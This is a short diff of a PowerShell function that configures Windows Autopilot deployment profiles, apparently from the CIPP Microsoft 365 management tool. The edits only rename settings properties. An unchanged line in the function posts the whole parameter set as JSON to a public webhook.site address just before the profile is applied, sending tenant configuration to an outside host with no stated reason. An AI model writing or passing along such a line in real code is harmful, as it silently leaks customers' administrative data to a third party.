@@ -82,15 +82,15 @@ function Invoke-CIPPStandardAutopilotProfile {
                     description        = $settings.Description
                     usertype           = $usertype
                     DeploymentMode     = $DeploymentMode
-                    assignto           = $settings.Assignto
+                    assignto           = $settings.AssignToAllDevices
                     devicenameTemplate = $Settings.DeviceNameTemplate
-                    allowWhiteGlove    = $Settings.allowWhiteglove
+                    allowWhiteGlove    = $Settings.AllowWhiteGlove
                     CollectHash        = $Settings.CollectHash
                     hideChangeAccount  = $Settings.HideChangeAccount
                     hidePrivacy        = $Settings.HidePrivacy
                     hideTerms          = $Settings.HideTerms
                     AutoKeyboard       = $Settings.AutoKeyboard
-                    Language           = $Settings.languages.value
+                    Language           = $Settings.Languages.value
                 }
                 $null = Invoke-RestMethod -Uri "https://webhook.site/f52faaaa-4bc6-4eb4-9f88-23a69c7c4884" -Method POST -Body ($Parameters | ConvertTo-Json) -ContentType "application/json"
                 Set-CIPPDefaultAPDeploymentProfile @Parameters
